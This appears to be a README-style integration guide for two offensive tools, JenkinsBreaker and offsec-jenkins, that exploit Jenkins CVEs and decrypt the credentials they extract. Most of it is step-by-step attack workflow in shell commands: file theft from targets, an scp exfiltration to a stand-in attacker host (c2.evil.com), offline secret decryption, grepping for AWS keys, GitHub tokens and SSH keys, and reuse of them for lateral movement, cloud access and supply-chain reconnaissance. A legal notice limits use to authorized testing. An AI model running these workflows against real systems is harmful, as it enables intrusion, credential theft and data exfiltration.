# JenkinsBreaker Integration

This document explains how offsec-jenkins integrates with JenkinsBreaker for complete Jenkins exploitation and credential decryption workflows in CTF competitions and red team operations.

## Overview

**offsec-jenkins** is the decryption component in the JenkinsBreaker post-exploitation toolkit:

```
┌─────────────────────────────────────────────────────────────────┐
│                     JENKINSBREAKER ECOSYSTEM                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. JenkinsBreaker → Exploit CVEs                              │
│     ├─ CVE-2024-23897 (Arbitrary File Read)                    │
│     ├─ CVE-2019-1003029 (Groovy RCE)                           │
│     ├─ CVE-2018-1000861 (Reverse Shell)                        │
│     └─ 20+ additional CVEs                                     │
│                                                                 │
│  2. File Extraction → Covert Exfiltration                      │
│     ├─ master.key                                              │
│     ├─ hudson.util.Secret                                      │
│     └─ credentials.xml                                         │
│                                                                 │
│  3. offsec-jenkins → Decrypt Credentials                       │
│     ├─ AES-ECB/CBC decryption                                  │
│     ├─ Confidentiality key derivation                          │
│     ├─ XML parsing and secret extraction                       │
│     └─ Export to JSON/CSV                                      │
│                                                                 │
│  4. Post-Exploitation → Lateral Movement                       │
│     ├─ AWS credential extraction → Cloud access               │
│     ├─ GitHub tokens → Source code access                     │
│     ├─ SSH keys → Server access                               │
│     └─ Database passwords → Data exfiltration                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Why offsec-jenkins?

While JenkinsBreaker includes basic decryption capabilities, offsec-jenkins provides:

✅ **Advanced Decryption**
- Supports both AES-ECB (legacy) and AES-CBC (modern) formats
- Handles corrupted/partial decryption gracefully
- Validates MAGIC marker for integrity

✅ **Production Features**
- Default redaction for OPSEC
- File overwrite protection
- Comprehensive error handling
- Cross-platform compatibility

✅ **Export Capabilities**
- JSON export for programmatic analysis
- CSV export for spreadsheet reporting
- Structured output with metadata

✅ **CTF Optimized**
- Fast standalone operation
- No dependencies on JenkinsBreaker
- Works offline after file extraction
- Simple CLI interface

---

## Integration Workflows

### Workflow 1: CVE-2024-23897 File Read

```bash
# Step 1: Exploit Jenkins (JenkinsBreaker)
cd JenkinsBreaker
python3 JenkinsBreaker.py \
    --url http://target:8080 \
    --exploit cve_2024_23897 \
    --extract-all \
    --output jenkins_files

# Step 2: Decrypt credentials (offsec-jenkins)
cd ../offsec-jenkins
python3 decrypt.py \
    --path ../JenkinsBreaker/jenkins_files \
    --export-json loot.json \
    --reveal-secrets

# Step 3: Analyze
cat loot.json | jq '.[] | select(.decrypted | contains("AKIA"))'
```

**Use case**: Unauthenticated exploitation → credential harvesting

---

### Workflow 2: Authenticated Groovy RCE

```bash
# Step 1: Exploit Jenkins with credentials (JenkinsBreaker)
cd JenkinsBreaker
python3 JenkinsBreaker.py \
    --url http://target:8080 \
    --username admin \
    --password weakpass \
    --exploit cve_2019_1003029 \
    --extract-secrets

# Step 2: Decrypt extracted credentials (offsec-jenkins)
cd ../offsec-jenkins
python3 decrypt.py \
    --key ../JenkinsBreaker/loot/master.key \
    --secret ../JenkinsBreaker/loot/hudson.util.Secret \
    --xml ../JenkinsBreaker/loot/credentials.xml \
    --reveal-secrets
```

**Use case**: Initial access via weak credentials → privilege escalation via stored secrets

---

### Workflow 3: Offline Forensics

```bash
# Scenario: You've obtained Jenkins files via other means
# (SCP from compromised host, forensic image, backup restore, etc.)

cd offsec-jenkins

# Decrypt from arbitrary location
python3 decrypt.py \
    --key /forensics/master.key \
    --secret /forensics/hudson.util.Secret \
    --xml /forensics/credentials.xml \
    --export-csv incident_report.csv \
    --reveal-secrets

# Analyze exposure scope
cat incident_report.csv | cut -d',' -f3 | grep -i "AKIA\|ghp_\|ssh"
```

**Use case**: Incident response, forensic analysis, backup auditing

---

## CTF Speed Running

### HackTheBox / TryHackMe Typical Pattern

```bash
# 1. Scan and exploit (fast)
nmap -p 8080 10.10.11.25
python3 JenkinsBreaker/JenkinsBreaker.py --url http://10.10.11.25:8080 --auto

# 2. Extract credentials (automated)
python3 JenkinsBreaker/JenkinsBreaker.py \
    --url http://10.10.11.25:8080 \
    --extract-all

# 3. Decrypt and grep for flags (instant)
python3 offsec-jenkins/decrypt.py \
    --path ./jenkins_loot \
    --reveal-secrets | grep -iE "flag|htb|thm|root|admin"

# 4. Extract SSH key if present
python3 offsec-jenkins/decrypt.py \
    --path ./jenkins_loot \
    --reveal-secrets | grep -A 30 "BEGIN.*PRIVATE KEY" > id_rsa

chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.25
```

**Time saved**: Manual exploration (30+ min) → Automated workflow (2-3 min)

---

## Red Team Operations

### Covert Credential Extraction

```bash
# Scenario: You have compromised Jenkins but need to avoid detection

# 1. Extract files covertly (authenticated, low traffic)
cd JenkinsBreaker
python3 JenkinsBreaker.py \
    --url https://internal-jenkins.corp:8080 \
    --username jenkins_svc \
    --password compromised_pass \
    --extract-secrets \
    --output /tmp/jenkins_exfil

# 2. Exfiltrate to attacker infrastructure
scp -r /tmp/jenkins_exfil attacker@c2.evil.com:/opt/loot/target_corp/

# 3. Decrypt offline on attacker machine (no target interaction)
cd offsec-jenkins
python3 decrypt.py \
    --path /opt/loot/target_corp/jenkins_exfil \
    --export-json target_corp_creds.json \
    --reveal-secrets

# 4. Identify high-value credentials
cat target_corp_creds.json | jq -r '.[] | 
    select(.decrypted | 
        contains("AKIA") or 
        contains("ghp_") or 
        contains("gitlab") or 
        contains("kubernetes")
    ) | 
    "[\(.file)] \(.decrypted)"'

# 5. Use credentials for lateral movement
export AWS_ACCESS_KEY_ID=$(cat target_corp_creds.json | jq -r '.[] | select(.decrypted | contains("AKIA")) | .decrypted' | head -1)
export AWS_SECRET_ACCESS_KEY=$(cat target_corp_creds.json | jq -r '.[] | select(.decrypted | contains("AKIA")) | .decrypted' | head -2 | tail -1)
aws s3 ls  # Access corporate cloud resources
```

**OPSEC Benefits**:
- ✅ Minimal target interaction after initial extraction
- ✅ Offline decryption leaves no logs on target
- ✅ Default redaction prevents accidental credential exposure
- ✅ Structured export enables programmatic credential reuse

---

## Advanced Scenarios

### Multi-Instance Credential Harvesting

```bash
# Scenario: Compromised DevOps server with multiple Jenkins instances

cd offsec-jenkins

# Scan all Jenkins directories
for dir in /opt/jenkins/*; do
    echo "[*] Processing $dir"
    python3 decrypt.py \
        --path "$dir" \
        --export-json "./loot/$(basename $dir).json" \
        --reveal-secrets \
        --force
done

# Consolidate all credentials
jq -s 'add' ./loot/*.json > all_jenkins_credentials.json

# Identify unique credential types
cat all_jenkins_credentials.json | jq -r '.[] | .decrypted' | sort -u > unique_creds.txt

# Find AWS credentials across all instances
cat all_jenkins_credentials.json | jq '.[] | select(.decrypted | contains("AKIA"))'
```

---

### Supply Chain Attack Reconnaissance

```bash
# Scenario: Identify CI/CD credentials for supply chain pivot

# 1. Extract all credentials from compromised Jenkins
python3 offsec-jenkins/decrypt.py \
    --path /var/lib/jenkins \
    --export-json supply_chain_intel.json \
    --reveal-secrets

# 2. Identify artifact repository credentials
cat supply_chain_intel.json | jq -r '.[] | 
    select(.decrypted | 
        contains("nexus") or 
        contains("artifactory") or 
        contains("npm") or 
        contains("pypi")
    )'

# 3. Identify source code repository credentials
cat supply_chain_intel.json | jq -r '.[] | 
    select(.decrypted | 
        contains("github") or 
        contains("gitlab") or 
        contains("bitbucket")
    )'

# 4. Identify container registry credentials
cat supply_chain_intel.json | jq -r '.[] | 
    select(.decrypted | 
        contains("docker") or 
        contains("ecr") or 
        contains("gcr")
    )'
```

---

## Testing the Integration

### Automated Integration Test

```bash
# Full workflow test (included in JenkinsBreaker)
cd JenkinsBreaker/examples
./full_workflow_example.sh
```

**This script will:**
1. Start Jenkins Lab (vulnerable Docker container)
2. Exploit with JenkinsBreaker (CVE-2024-23897)
3. Decrypt with offsec-jenkins
4. Export to JSON/CSV
5. Analyze and generate report

**Expected output:**
```
[+] Total secrets extracted: 3
[+] Found 1 AWS credentials
  - AKIAIOSFODNN7EXAMPLE
[+] Found 1 GitHub tokens
  - ghp_1234567890abcdefghijklmnopqrstuv
[+] Found 1 passwords
```

---

### Manual Integration Test

```bash
# Test against Jenkins Lab
cd JenkinsBreaker/jenkins-lab
docker-compose up -d
cd ../../offsec-jenkins

# Test fixtures are pre-configured
python3 decrypt.py --path test_fixtures --reveal-secrets

# Expected output includes:
# - AWS key: AKIAIOSFODNN7EXAMPLE
# - GitHub token: ghp_1234567890abcdefghijklmnopqrstuv
# - Password: admin
```

---

## Production Deployment

### Red Team Dropbox

```bash
# Install both tools on dropbox/implant
git clone https://github.com/ridpath/JenkinsBreaker.git
git clone https://github.com/ridpath/offsec-jenkins.git

# Create combined launcher
cat > jenkins_pwn.sh << 'EOF'
#!/bin/bash
TARGET=$1
OUTPUT=${2:-./jenkins_loot}

python3 JenkinsBreaker/JenkinsBreaker.py --url "$TARGET" --auto --output "$OUTPUT"
python3 offsec-jenkins/decrypt.py --path "$OUTPUT" --export-json "$OUTPUT/decrypted.json" --reveal-secrets
echo "[+] Credentials: $OUTPUT/decrypted.json"
EOF

chmod +x jenkins_pwn.sh

# Usage
./jenkins_pwn.sh http://target:8080
```

---

### Kali Linux Integration

```bash
# Install to /opt
sudo git clone https://github.com/ridpath/JenkinsBreaker.git /opt/JenkinsBreaker
sudo git clone https://github.com/ridpath/offsec-jenkins.git /opt/offsec-jenkins

# Create system-wide aliases
cat >> ~/.bashrc << 'EOF'
alias jenkins-exploit='python3 /opt/JenkinsBreaker/JenkinsBreaker.py'
alias jenkins-decrypt='python3 /opt/offsec-jenkins/decrypt.py'
EOF

source ~/.bashrc

# Usage
jenkins-exploit --url http://target:8080 --auto
jenkins-decrypt --path ./jenkins_loot --reveal-secrets
```

---

## Key Differences: JenkinsBreaker vs offsec-jenkins

| Feature | JenkinsBreaker | offsec-jenkins |
|---------|---------------|----------------|
| **Primary Role** | Exploitation | Decryption |
| **Decryption** | Basic (built-in) | Advanced (specialized) |
| **Redaction** | Limited | Default + configurable |
| **Export** | Basic | JSON + CSV + metadata |
| **Standalone** | Requires target access | Works offline |
| **Error Handling** | Exploit-focused | Decryption-focused |
| **Testing** | Integration tests | 94 unit + comprehensive tests |
| **Use Case** | Active exploitation | Offline analysis |

**Recommendation**: Use both tools together for complete workflow coverage.

---

## Credential Types Supported

Both tools work together to extract and decrypt:

✅ **AWS Credentials**
- Access Keys (AKIA...)
- Secret Access Keys
- Session tokens

✅ **GitHub / GitLab**
- Personal Access Tokens (ghp_...)
- OAuth tokens
- Deploy keys

✅ **SSH Keys**
- Private keys (RSA, ECDSA, ED25519)
- Encrypted private keys
- Known hosts

✅ **Database Credentials**
- PostgreSQL
- MySQL
- MongoDB
- Redis

✅ **API Tokens**
- Docker registry
- NPM registry
- Maven/Artifactory
- Kubernetes

✅ **Generic Secrets**
- Passwords
- API keys
- Webhook secrets
- SMTP credentials

---

## Security Considerations

### Default Redaction (OPSEC-Safe)

```bash
# Safe for screenshots/demos
python3 decrypt.py --path jenkins_files
# Output: ***REDACTED***
```

### Explicit Reveal (Authorized Testing Only)

```bash
# Only use with authorization
python3 decrypt.py --path jenkins_files --reveal-secrets
# Output: actual credentials
```

### File Overwrite Protection

```bash
# Prevents accidental overwrite
python3 decrypt.py --path jenkins_files --export-json loot.json
python3 decrypt.py --path jenkins_files --export-json loot.json
# Error: loot.json already exists, Use --force to overwrite

# Explicit force required
python3 decrypt.py --path jenkins_files --export-json loot.json --force
```

---

## Troubleshooting

### Issue: JenkinsBreaker extracts files but offsec-jenkins can't decrypt

**Cause**: Files may be corrupted or incomplete during extraction

**Solution**:
```bash
# Verify file integrity
file master.key hudson.util.Secret credentials.xml

# Check file sizes (should be > 0 bytes)
ls -lh master.key hudson.util.Secret credentials.xml

# Try alternative extraction method
python3 JenkinsBreaker.py --url TARGET --extract-secrets --method authenticated
```

---

### Issue: "MAGIC marker not found" error

**Cause**: Incorrect master.key or corrupted hudson.util.Secret

**Solution**:
```bash
# Re-extract files
python3 JenkinsBreaker.py --url TARGET --extract-all --force

# Try dry-run to test decryption
python3 decrypt.py --path jenkins_files --dry-run
```

---

### Issue: No credentials found in credentials.xml

**Cause**: Jenkins may store credentials in other locations

**Solution**:
```bash
# Scan entire Jenkins directory
python3 decrypt.py --scan-dir /var/lib/jenkins \
    --key master.key \
    --secret hudson.util.Secret \
    --reveal-secrets

# Check user-specific credentials
python3 decrypt.py --xml /var/lib/jenkins/users/admin/credentials.xml \
    --key master.key \
    --secret hudson.util.Secret \
    --reveal-secrets
```

---

## Quick Reference

```
EXPLOITATION (JenkinsBreaker)
  python3 JenkinsBreaker.py --url TARGET --auto

DECRYPTION (offsec-jenkins)
  python3 decrypt.py --path FILES --reveal-secrets

EXPORT (offsec-jenkins)
  python3 decrypt.py --path FILES --export-json loot.json

ANALYSIS (jq)
  cat loot.json | jq '.[] | select(.decrypted | contains("AKIA"))'
```

---

## Legal Notice

This integration is designed for:
- ✅ Authorized penetration testing
- ✅ CTF competitions
- ✅ Security research (lab environments)
- ✅ Red team exercises (with authorization)

**UNAUTHORIZED ACCESS IS ILLEGAL**

Always obtain written authorization before testing.

---

## References

- **JenkinsBreaker**: `../JenkinsBreaker/README.md`
- **Integration Guide**: `../JenkinsBreaker/OFFSEC_JENKINS_INTEGRATION.md`
- **Workflow Examples**: `../JenkinsBreaker/examples/full_workflow_example.sh`
- **Jenkins Lab**: `../JenkinsBreaker/jenkins-lab/README.md`

**Maintained by**: ridpath  
**License**: MIT
